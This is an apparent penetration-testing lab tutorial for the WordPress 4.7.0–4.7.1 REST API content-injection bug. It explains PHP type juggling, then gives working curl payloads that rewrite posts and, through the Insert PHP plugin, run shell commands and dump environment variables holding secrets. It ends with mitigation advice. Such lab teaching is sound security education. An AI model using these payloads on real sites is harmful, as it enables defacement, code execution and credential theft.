## WordPress Remote Post Editing

### Background

WordPress is a Content Management System that is written in PHP. PHP is a very popular language that is primarially used on the web. Unlike other languages, you do not need to declare datatypes in PHP.

Instead, PHP will do its best to guess what type your data is -- this is called [Type Juggling](https://secure.php.net/manual/en/language.types.type-juggling.php).

Example from PHP's documentation:

```php
<?php
  $foo = "1";  // $foo is string (ASCII 49)
  $foo *= 2;   // $foo is now an integer (2)
  $foo = $foo * 1.3;  // $foo is now a float (2.6)
  $foo = 5 * "10 Little Piggies"; // $foo is integer (50)
  $foo = 5 * "10 Small Pigs";     // $foo is integer (50)
?>
```
As you can see in the example above, PHP will actually convert a string to an interger as long as the first character is an integer. This is the foundation of this vulnerability.

Starting in WordPress version 4.7, the new [REST API](https://en.wikipedia.org/wiki/Representational_state_transfer) is enabled by default. With this API, you can do things like edit a blog post by `POST`-ing a json payload to `hostname/?rest_route=/wp/v2/posts/1`

If you `POST` a json payload with a string that begins with a number (`1string`) as the `id`, WordPress skips authentication, PHP converts `1string` string to `1` integer, and replaces the post's body with whatever you passed as the body of your json payload.

### Setup

In order to get started, you will need to start our WordPress image.

```
$ penkit start wordpress:4.7
Creating wordpress_mysql
Creating wordpress
```

You can confirm that your contain started by typing...

```
$ penkit ps
```

You can also `ping` it...

```
$ penkit ping wordpress

```

or fetch it with `curl`.

```
$ penkit curl wordpress
```


### Discovery

Now that your WordPress site is running, it's time to see if it is vulnerable to this attack. We are going to use an excellent tool called WPScan to do this.

```
penkit wpscan -u wordpress
```

You will see a ton of output. Here are the things you should look for.

```
[!] The WordPress 'http://wordpress/readme.html' file exists exposing a version number
[+] WordPress version 4.7 (Released on 2016-12-06) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 18 vulnerabilities identified from the version number
[!] Title: WordPress 4.7.0-4.7.1 - Unauthenticated Page/Post Content Modification via REST API
    Reference: https://wpvulndb.com/vulnerabilities/8734
    Reference: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
    Reference: https://blogs.akamai.com/2017/02/wordpress-web-api-vulnerability.html
    Reference: https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab
    Reference: https://github.com/WordPress/WordPress/commit/e357195ce303017d517aff944644a7a1232926f7
    Reference: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_content_injection
[i] Fixed in: 4.7.2
```

### Exploit

To exploit this vulnerability, we are going to create a json payload and `POST` it to the server. In order for this exploit to work, you must append a string to the end of the `id` of the post that you wish to alter.

```
1string
```

From there, simply replace 'title' and 'content' with anything you'd like. 

Example:

```
$ penkit curl -H "Content-Type: application/json" -X POST -d '{"id":"1string", "title":"Running an old version of WordPress is dangerous...", "content":"You should upgrade!"}' wordpress/?rest_route=/wp/v2/posts/1
```

That's it!

Confirm that you made a change to the page.

```
$ penkit curl wordpress/?p=1 | grep dangerous
```

Of course having a site that is easily vandalized is not good but it could get way, way worse if certain WordPress addons are installed.

If the maintainer of the website has an addon like [Insert PHP](http://www.willmaster.com/software/WPplugins/insert-php-wordpress-plugin.php) (which has over 100k downloads) installed then you can inject
php into the body of the post. From there, you can do a number of things including executing arbitrary commands in the linux terminal, dump php config files, dump ENV variables, and even use php to load a remote payload.

Example: 

You can check out their current directory.

```
$ penkit curl -H "Content-Type: application/json" -X POST -d '{"id":"1string", "title":"Nothing to see here", "content":"[insert_php]$output=shell_exec('ls');echo $output;[/insert_php]"}' wordpress/?rest_route=/wp/v2/posts/1
```

You can have a look at their PHP setup.

```
$ penkit curl -H "Content-Type: application/json" -X POST -d '{"id":"1string", "title":"Nothing to see here", "content":"[insert_php]$output=phpinfo();echo $output;[/insert_php]"}' wordpress/?rest_route=/wp/v2/posts/1
```

Or you can just cut right to the chase and grab API keys and passwords by dumping their ENV variables.

```
$ penkit curl -H "Content-Type: application/json" -X POST -d '{"id":"1string", "title":"Nothing to see here", "content":"[insert_php]$output=shell_exec('env');echo $output;[/insert_php]"}' wordpress/?rest_route=/wp/v2/posts/1
```

When you're done you can clean up `wordpress`, `wordpress_mysql`, and any other penkit containers.

```
$ penkit rm
Are you sure you want to remove 2 containers? [y/N] y
1295f1c3bdbd
ad2362b1f983
```

### Summary

This vulnerability could, at the very least, open a site up to vandalism and, at worst, lead to complete server compromise.

You can mitigate this risk by:

- Upgrading WordPress anytime an update is available.
- Never run pluggins that give content creators control of the backend language (PHP).
- Delete the `readme.html` file from the wordpress directory.

[More information about this vulnerability can be found here.](https://wpvulndb.com/vulnerabilities/8734)
